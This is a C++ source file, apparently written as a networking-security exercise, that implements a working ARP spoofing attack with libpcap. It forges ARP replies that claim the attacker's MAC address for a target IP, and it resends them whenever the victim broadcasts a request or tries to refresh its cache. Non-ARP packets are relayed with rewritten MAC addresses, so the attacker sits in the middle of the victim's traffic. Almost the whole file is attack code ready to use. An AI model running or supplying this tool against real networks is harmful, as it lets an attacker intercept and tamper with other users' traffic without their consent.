#include "arpattk.h"

void arp_request(pcap_t* handle, Ip sender_ip, Ip attacker_ip, Mac attacker_mac){
	EthArpPacket packet;

	packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
	packet.eth_.smac_ = attacker_mac;
	packet.eth_.type_ = htons(EthHdr::Arp);
	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = attacker_mac;
	packet.arp_.sip_ = htonl(attacker_ip);
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
	packet.arp_.tip_ = htonl(sender_ip);

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
}

void send_arp(pcap_t* handle, EthArpPacket packet){
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	int res2 = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	if (res2 != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
}

EthArpPacket set_arp_packet(char* sender_ip, Mac sender_mac, char* target_ip, char* attacker_ip, uint8_t* attacker_mac){
	EthArpPacket packet; 
	packet.eth_.dmac_ = Mac(sender_mac);
	packet.eth_.smac_ = Mac(attacker_mac);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Reply);
	packet.arp_.smac_ = Mac(attacker_mac);
	packet.arp_.sip_ = htonl(Ip(target_ip));
	packet.arp_.tmac_ = Mac(sender_mac);
	packet.arp_.tip_ = htonl(Ip(sender_ip));

	return packet;
}

uint32_t set_arp_packet2(EthArpPacket* packet, Ip sender_ip, Mac sender_mac, Ip target_ip, Ip attacker_ip, Mac attacker_mac){
	packet->eth_.dmac_ = sender_mac;
	packet->eth_.smac_ = attacker_mac;
	packet->eth_.type_ = htons(EthHdr::Arp);
	packet->arp_.hrd_ = htons(ArpHdr::ETHER);
	packet->arp_.pro_ = htons(EthHdr::Ip4);
	packet->arp_.hln_ = Mac::SIZE;
	packet->arp_.pln_ = Ip::SIZE;
	packet->arp_.op_ = htons(ArpHdr::Reply);
	packet->arp_.smac_ = attacker_mac;
	packet->arp_.sip_ = htonl(target_ip);
	packet->arp_.tmac_ = sender_mac;
	packet->arp_.tip_ = htonl(sender_ip);

	return 1;
}

void arp_spoof_flow(pcap_t* handle, pcap_pkthdr* pkt_header, const u_char* packet,  ArpTableThreadArgv* attack_data){
	EthArpPacket sender_reply_packet;
	set_arp_packet2(&sender_reply_packet, attack_data->sender_ip, attack_data->sender_mac, attack_data->target_ip, attack_data->attacker_ip, attack_data->attacker_mac);
	// send_arp(handle, sender_reply_packet);

	printf("[attack_data]sender_ip: %s\n", ((std::string)attack_data->sender_ip).c_str());
	printf("[attack_data]sender_mac: %s\n", ((std::string)attack_data->sender_mac).c_str());
	printf("[attack_data]target_ip: %s\n", ((std::string)attack_data->target_ip).c_str());
	printf("[attack_data]target_mac: %s\n", ((std::string)attack_data->target_mac).c_str());
	printf("[attack_data]attacker_ip: %s\n", ((std::string)attack_data->attacker_ip).c_str());
	printf("[attack_data]attacker_mac: %s\n", ((std::string)attack_data->attacker_mac).c_str());

	EthArpPacket* e_arp_packet = (EthArpPacket*)packet;
	if (e_arp_packet->eth_.type() == EthHdr::Arp){
		
		if(e_arp_packet->eth_.dmac().isBroadcast()){
			printf("[DEBUG%s] arp_spoof_flow 3-1========\n", ((std::string)attack_data->sender_ip).c_str());
			send_arp(handle, sender_reply_packet);
		}
		if(e_arp_packet->arp_.sip() == attack_data->sender_ip && e_arp_packet->arp_.tip() == attack_data->target_ip){
			printf("[DEBUG%s] arp_spoof_flow 3-2========\n", ((std::string)attack_data->sender_ip).c_str());
			send_arp(handle, sender_reply_packet);
		}

	} else { // arp 패킷이 아닌 경우
	
		// arp 패킷이 아니면 mac 변조해서 target한테 전송
		EthHdr* ip_packet = (EthHdr*)packet;
		ip_packet->smac_ = attack_data->attacker_mac;
		ip_packet->dmac_ = attack_data->target_mac;
		
		int relay_res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(ip_packet), pkt_header->caplen);
		if (relay_res != 0) {
			fprintf(stderr, "[%s]pcap_sendpacket return %d error=%s\n", ((std::string)attack_data->sender_ip).c_str(), relay_res, pcap_geterr(handle));
		}
		printf("[%s] one flow done\n",((std::string)attack_data->sender_ip).c_str());
	}
}